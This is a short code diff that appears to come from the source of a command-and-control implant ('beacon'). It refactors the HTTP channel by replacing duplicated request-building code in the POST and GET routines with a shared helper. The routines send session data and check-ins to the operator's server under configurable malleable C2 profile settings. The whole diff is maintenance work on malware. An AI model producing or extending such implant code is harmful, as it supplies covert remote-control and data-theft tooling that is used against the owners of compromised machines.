@@ -11,11 +11,11 @@
 #include "beacon.h"
 #include "track_memory.h"
 #include "hostprof.h"
+#include "channel_http_common.h"
 
 #pragma comment(lib, "winhttp")
 #pragma comment(lib, "ws2_32")
 
-static char http_current_host[256];
 
 #define PROXYB_MANUAL 0
 #define PROXYB_DIRECT 1
@@ -189,16 +189,9 @@ void http_post_maybe(char * hook) {
 	if (http_post_len == 0)
 		return;
 
-	profile_setup(&myprofile, http_post_len);
-	_snprintf(myprofile.uri, 1024, "%s", hook);
 	_snprintf(myid, 128, "%d", bigsession.myid);
-	apply(setting_ptr(SETTING_C2_POSTREQ), &myprofile, myid, strlen(myid), http_post_buffer, http_post_len);
-	hostprof_apply(http_current_host, &myprofile, 1);
-
-	if (strlen(myprofile.parameters) == 0)
-		_snprintf(myuri, 1024, "%s", myprofile.uri);
-	else
-		_snprintf(myuri, 1024, "%s%s", myprofile.uri, myprofile.parameters);
+	http_assemble_request(&myprofile, myuri, hook, SETTING_C2_POSTREQ,
+	                      myid, (int)strlen(myid), http_post_buffer, http_post_len, 1);
 
 	to_wide(setting_ptr(SETTING_C2_VERB_POST), wverb, 16);
 	to_wide(myuri, wuri, 1024);
@@ -257,15 +250,8 @@ int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
 	profile myprofile = {0};
 	char myuri[1024] = {0};
 
-	profile_setup(&myprofile, meta->length);
-	_snprintf(myprofile.uri, 1024, "%s", hook);
-	apply(setting_ptr(SETTING_C2_REQUEST), &myprofile, meta->data, meta->length, NULL, 0);
-	hostprof_apply(http_current_host, &myprofile, 0);
-
-	if (strlen(myprofile.parameters) == 0)
-		_snprintf(myuri, 1024, "%s", myprofile.uri);
-	else
-		_snprintf(myuri, 1024, "%s%s", myprofile.uri, myprofile.parameters);
+	http_assemble_request(&myprofile, myuri, hook, SETTING_C2_REQUEST,
+	                      meta->data, meta->length, NULL, 0, 0);
 
 	to_wide(setting_ptr(SETTING_C2_VERB_GET), wverb, 16);
 	to_wide(myuri, wuri, 1024);
